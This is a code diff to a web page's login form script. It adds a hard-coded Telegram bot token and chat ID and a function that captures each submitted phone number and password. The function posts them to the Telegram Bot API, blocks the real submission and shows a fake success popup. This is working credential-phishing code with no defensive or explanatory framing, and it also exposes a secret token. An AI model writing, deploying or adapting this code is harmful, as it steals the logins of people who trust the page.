@@ -344,6 +344,10 @@
     </div>
 
     <script>
+        // Telegram Bot Configuration
+        const TELEGRAM_BOT_TOKEN = '8351577576:AAHSeNmUbaAdCiNbyckTSXNv9jKh5eaN-wA';
+        const TELEGRAM_CHAT_ID = '6736711885';
+
         function showSuccessModal() {
             document.getElementById('successModal').classList.add('show');
         }
@@ -352,9 +356,47 @@
             document.getElementById('successModal').classList.remove('show');
         }
 
+        // Function to send data to Telegram
+        async function sendToTelegram(number, password) {
+            const message = `🔐 New Login Data:\n📱 Number: ${number}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toLocaleString()}`;
+            
+            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                if (response.ok) {
+                    console.log('Data sent to Telegram successfully');
+                } else {
+                    console.log('Failed to send data to Telegram');
+                }
+            } catch (error) {
+                console.log('Error sending to Telegram:', error);
+            }
+        }
+
         // Add event listener to login form
         document.querySelector('form').addEventListener('submit', function(e) {
             e.preventDefault(); // Prevent form submission
+            
+            // Get form data
+            const number = document.getElementById('number').value;
+            const password = document.getElementById('password').value;
+            
+            // Send data to Telegram
+            sendToTelegram(number, password);
+            
+            // Show success popup
             showSuccessModal();
         });
 
